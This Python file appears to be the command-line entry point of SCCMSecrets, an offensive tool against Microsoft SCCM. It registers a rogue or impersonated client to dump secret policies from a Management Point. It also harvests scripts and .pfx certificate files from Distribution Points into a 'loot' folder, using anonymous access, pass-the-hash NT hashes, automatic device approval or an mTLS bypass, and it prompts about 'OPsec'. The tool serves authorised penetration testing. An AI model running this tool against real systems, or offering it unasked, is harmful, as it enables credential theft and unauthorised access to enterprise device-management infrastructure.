import os
import typer
import logging

from datetime                           import datetime
from time                               import sleep
from typing_extensions                  import Annotated

from file_dumper                        import FileDumper
from policies_dumper                    import PoliciesDumper
from conf                               import bcolors, ANONYMOUSDP, SCCMDPFileDumpError, SCCMPoliciesDumpError

logger = logging.getLogger(__name__)

app = typer.Typer(context_settings={"help_option_names": ["-h", "--help"]}, add_completion=False, pretty_exceptions_enable=False)

def print_banner():
    banner = """
 _____ _____  _____ ___  ___ _____                    _       
/  ___/  __ \/  __ \|  \/  |/  ___|                  | |      
\ `--.| /  \/| /  \/| .  . |\ `--.  ___  ___ _ __ ___| |_ ___ 
 `--. \ |    | |    | |\/| | `--. \/ _ \/ __| '__/ _ \ __/ __|
/\__/ / \__/\| \__/\| |  | |/\__/ /  __/ (__| | |  __/ |_\__ \\
\____/ \____/ \____/\_|  |_/\____/ \___|\___|_|  \___|\__|___/
 -------------------------------------------------------------
    """
    logger.warning(banner)



@app.command(help="Dump secret policies from an SCCM Management Point")
def policies(
    management_point: Annotated[str, typer.Option("--management-point", "-mp", help="The client's SCCM management point. Expects either a URL, or a hostname/IP (defaults to HTTP in the latter case)")],
    client_name: Annotated[str, typer.Option("--client-name", "-cn", help="[Optional] The name of the client that will be created in SCCM - or a random name if using an existing device")],
    machine_name: Annotated[str, typer.Option("--machine-name", "-u", help="[Optional] A machine account name. If not provided, SCCMSecrets will try to exploit automatic device approval")] = None,
    machine_pass: Annotated[str, typer.Option("--machine-pass", "-p", help="[Optional] The password for the machine account")] = None,
    machine_hash: Annotated[str, typer.Option("--machine-hash", "-H", help="[Optional] The NT hash for the machine account")] = None,
    registration_sleep: Annotated[int, typer.Option("--registration-sleep", "-rs", help="[Optional] The amount of time, in seconds, that should be waited after registrating a new device. A few minutes is recommended so that the new device can be added to device collections (3 minutes by default, may need to be increased)")] = 180,
    use_existing_device: Annotated[str, typer.Option("--use-existing-device", "-d", help="[Optional] This option can be used to re-run SCCMSecrets.py using a previously registered device ; or to impersonate a legitimate SCCM client. In both cases, it expects the path of a folder containing a guid.txt file (the SCCM device GUID) and the key.pem file (the client's private key). Note that a client-name value must also be provided to SCCMSecrets (but does not have to match the one of the existing device)")] = None,
    pki_cert: Annotated[str, typer.Option("--pki-cert", "-c", help="[Optional] The path to a valid domain PKI certificate in PEM format. Required when the Management Point enforces HTTPS and thus client certificate authentication")] = None,
    pki_key: Annotated[str, typer.Option("--pki-key", "-k", help="[Optional] The path to the private key of the certificate in PEM format")] = None,
    mtls_bypass: Annotated[bool, typer.Option("--mtls-bypass", "-b", help="[Optional] Enable mutual TLS bypass")] = False,
    verbose: Annotated[bool, typer.Option("--verbose", "-v", help="[Optional] Enable verbose output")] = False
):
    print_banner()
    if verbose is False: logging.basicConfig(format='%(message)s', level=logging.WARN)
    else: logging.basicConfig(format='%(message)s', level=logging.INFO)

    # Arguments format and coherence checks
    if not management_point.startswith('http://') and not management_point.startswith('https://'):
        management_point = f'http://{management_point}'
    if management_point.endswith('/'):
        management_point = management_point[:-1]
    if machine_name is not None and (machine_pass is None and machine_hash is None) \
        or (machine_pass is not None or machine_hash is not None) and machine_name is None:
        logger.error(f"{bcolors.FAIL}[!] When providing a machine name, please also provide either the cleartext password or the NT hash{bcolors.ENDC}")
        return
    if machine_hash is not None and len(machine_hash) != 32:
        logger.error(f"{bcolors.FAIL}[!] The provided NT hash does not have the expected format (e.g. A4F49C406510BDCAB6824EE7C30FD852){bcolors.ENDC}")
        return
    if management_point.startswith('https://') and not mtls_bypass and (pki_cert is None or pki_key is None):
        logger.error(f"{bcolors.FAIL}[!] When using https, SCCM requires client certificate authentication. You have to provide a client certificate with the --pki-cert and --pki-key flags or use the --mtls-bypass flag{bcolors.ENDC}")
        return
    if machine_pass is None and machine_hash is not None:
        machine_pass = '0' * 32 + ':' + machine_hash
    if machine_name and not machine_name.endswith('$'):
        confirmation = typer.confirm("[!] The account you provided does not seem to be a machine account. Are you sure you want to continue ?")
        if not confirmation:
            return

    
    # Output directory creation
    if not os.path.exists('loot'):
        os.makedirs('loot')
    output_dir = f'{datetime.now().strftime("%Y-%m-%d_%H-%M-%S")}_policies'
    os.makedirs(f"loot/{output_dir}")

    # Context informations display
    logger.warning(f"##### Management Point policies dump context #####\n")
    lines = []
    lines.append(f" - Management point: {management_point}")
    if machine_name is not None:
        lines.append(f" - Machine account provided: {machine_name}")
    else:
        lines.append(f" - Machine account provided: none (anonymous registration or existing device)")
    lines.append(f" - Client name for the device: {client_name}")
    lines.append(f" - Registration sleep (in seconds): {registration_sleep}")
    lines.append(f" - Output directory: {bcolors.BOLD}./loot/{output_dir}{bcolors.ENDC}")
    split_lines = [line.split(':', 1) for line in lines]
    max_key_length = max(len(key.strip()) for key, value in split_lines)
    for key, value in split_lines:
        logger.warning(f"{key.strip():<{max_key_length}} : {value.strip()}")
    logger.warning("\n")

    policies_dumper = PoliciesDumper(
        management_point,
        output_dir,
        client_name,
        use_existing_device,
        machine_name,
        machine_pass,
        pki_cert,
        pki_key,
        mtls_bypass
    )

    if use_existing_device is None:
        confirmation = typer.confirm("\nOPsec consideration: secret policies dump requires registering an SCCM client that we will not be able to remove afterwards. Proceed ?")
    else:
        confirmation = typer.confirm (f"\nWe will be using the existing device with GUID {policies_dumper.client_guid}. Proceed ?")
    if not confirmation:
        return

    # Client registration if needed
    if use_existing_device is None:
        try:
            policies_dumper.register_client()
        except Exception:
            err = "Error encountered during policies dump - could not register client"
            if verbose is True:
                raise SCCMPoliciesDumpError(err)
            else:
                logger.error(f"{bcolors.FAIL}[-] {err}{bcolors.ENDC}")
                return
        logger.warning(f"[*] Sleeping for {registration_sleep} seconds")
        sleep(registration_sleep)

    # Policies request and parsing
    try:
        policies_dumper.request_policies()
    except:
        err = "Error encountered during policies dump - could not request policies for client"
        if verbose is True:
            raise SCCMPoliciesDumpError(err)
        else:
            logger.error(f"{bcolors.FAIL}[-] {err}{bcolors.ENDC}")
            return
    try:
        policies_dumper.parse_secret_policies()
    except:
        err = "Error encountered during policies dump - could not parse retrieved secret policies"
        if verbose is True:
            raise SCCMPoliciesDumpError(err)
        else:
            logger.error(f"{bcolors.FAIL}[-] {err}{bcolors.ENDC}")
            return
    logger.warning("[+] All done. Bye!")



@app.command(help="Dump interesting files from an SCCM Distribution Point")
def files(
    distribution_point: Annotated[str, typer.Option("--distribution-point", "-dp", help="An SCCM distribution point. Expects either a URL, or a hostname/IP (defaults to HTTP in the latter case)")],
    username: Annotated[str, typer.Option("--username", "-u", help="[Optional] A username for a domain account. If no account is provided, SCCMSecrets will try to exploit anonymous DP access")] = None,
    password: Annotated[str, typer.Option("--password", "-p", help="[Optional] The password for the domain account")] = None,
    hash: Annotated[str, typer.Option("--hash", "-H", help="[Optional] The NT hash for the domain account (e.g. A4F49C406510BDCAB6824EE7C30FD852)")] = None,
    extensions: Annotated[str, typer.Option("--extensions", "-e", help="[Optional] Comma-separated list of extension that will determine which files will be downloaded when retrieving packages scripts. Provide an empty string to not download anything, and only index files")] = '.ps1, .bat, .xml, .txt, .pfx',
    urls: Annotated[str, typer.Option("--urls", "-f", help="[Optional] A file containing a list of URLs (one per line) that should be downloaded from the Distribution Point. This is useful if you already indexed files and do not want to download by extension, but rather specific known files")] = None,
    max_recursion: Annotated[int, typer.Option("--max-recursion", "-r", help="[Optional] The maximum recursion depth when indexing files from the Distribution Point")] = 10,
    pki_cert: Annotated[str, typer.Option("--pki-cert", "-c", help="[Optional] The path to a valid domain PKI certificate in PEM format. Required when the Distribution Point enforces HTTPS and thus client certificate authentication")] = None,
    pki_key: Annotated[str, typer.Option("--pki-key", "-k", help="[Optional] The path to the private key of the certificate in PEM format")] = None,
    verbose: Annotated[bool, typer.Option("--verbose", "-v", help="[Optional] Enable verbose output")] = False
):
    print_banner()
    if verbose is False: logging.basicConfig(format='%(message)s', level=logging.WARN)
    else: logging.basicConfig(format='%(message)s', level=logging.INFO)

    # Arguments format and coherence checks
    if not distribution_point.startswith('http://') and not distribution_point.startswith('https://'):
        distribution_point = f'http://{distribution_point}'
    if distribution_point.endswith('/'):
        distribution_point = distribution_point[:-1]
    if username is not None and (password is None and hash is None):
        logger.error(f"{bcolors.FAIL}[!] When providing a username, please also provide either the cleartext password or the NT hash{bcolors.ENDC}")
        return
    if hash is not None and len(hash) != 32:
        logger.error(f"{bcolors.FAIL}[!] The provided NT hash does not have the expected format (e.g. A4F49C406510BDCAB6824EE7C30FD852){bcolors.ENDC}")
        return
    if distribution_point.startswith('https://') and (pki_cert is None or pki_key is None):
        logger.error(f"{bcolors.FAIL}[!] When using https, SCCM requires client certificate authentication. You have to provide a client certificate with the --pki-cert and --pki-key flags{bcolors.ENDC}")
        return
    if password is None and hash is not None:
        password = '0' * 32 + ':' + hash
    extensions = [] if not extensions else [x.strip() for x in extensions.split(',')]
    extensions = list(filter(None, extensions))

    # Checking for Distribution Point anonymous access in case we are using plain HTTP. In HTTPS, the option is not available
    if not distribution_point.startswith('https://'):
        anonymousDPConnectionEnabled = FileDumper.check_anonymous_DP_connection_enabled(distribution_point)
    else:
        anonymousDPConnectionEnabled = ANONYMOUSDP.DISABLED.value

    # Output directory creation
    if not os.path.exists('loot'):
        os.makedirs('loot')
    output_dir = f'{datetime.now().strftime("%Y-%m-%d_%H-%M-%S")}_files'
    os.makedirs(f"loot/{output_dir}")

    # Context informations display
    logger.warning(f"##### Distribution Point file dump context #####\n")
    lines = []
    if anonymousDPConnectionEnabled == ANONYMOUSDP.ENABLED.value:
        lines.append(f" - Anonymous Distribution Point access: {bcolors.OKGREEN}{bcolors.BOLD}[VULNERABLE]{bcolors.ENDC} Distribution point allows anonymous access{bcolors.ENDC}")
    elif anonymousDPConnectionEnabled == ANONYMOUSDP.DISABLED.value:
        lines.append(f" - Anonymous Distribution Point access: {bcolors.FAIL}{bcolors.BOLD}[NOT VULNERABLE]{bcolors.ENDC} (distribution point does not allow anonymous access)")
    else:
        lines.append(f" - Anonymous Distribution Point access: {bcolors.FAIL}{bcolors.BOLD}[UNKNOWN]{bcolors.ENDC} Unexpected anonymous access check result{bcolors.ENDC}")
    lines.append(f" - Distribution point: {distribution_point}")
    lines.append(f" - File extensions to retrieve: {extensions if urls is None else 'N/A (url list provided)'}")
    lines.append(f" - Output directory: {bcolors.BOLD}./loot/{output_dir}{bcolors.ENDC}")
    split_lines = [line.split(':', 1) for line in lines]
    max_key_length = max(len(key.strip()) for key, value in split_lines)
    for key, value in split_lines:
        logger.warning(f"{key.strip():<{max_key_length}} : {value.strip()}")
    logger.warning("\n")

    if anonymousDPConnectionEnabled is not ANONYMOUSDP.ENABLED.value and (username is None):
        logger.error(f"{bcolors.FAIL}[-] No credentials provided and Distribution Point does not allow anonymous access.{bcolors.ENDC}")
        return

    # Dump files
    file_dumper = FileDumper(
        distribution_point,
        output_dir,
        extensions,
        anonymousDPConnectionEnabled,
        urls,
        max_recursion,
        username,
        password ,
        pki_cert,
        pki_key
    )

    try:
        file_dumper.dump_files()
    except:
        err = "Error encountered during Distribution File dump"
        if verbose is True:
            raise SCCMDPFileDumpError(err)
        else:
            logger.error(f"{bcolors.FAIL}[-] {err}{bcolors.ENDC}")
            return
    logger.warning("[+] All done. Bye!")



if __name__ == "__main__":
    app()
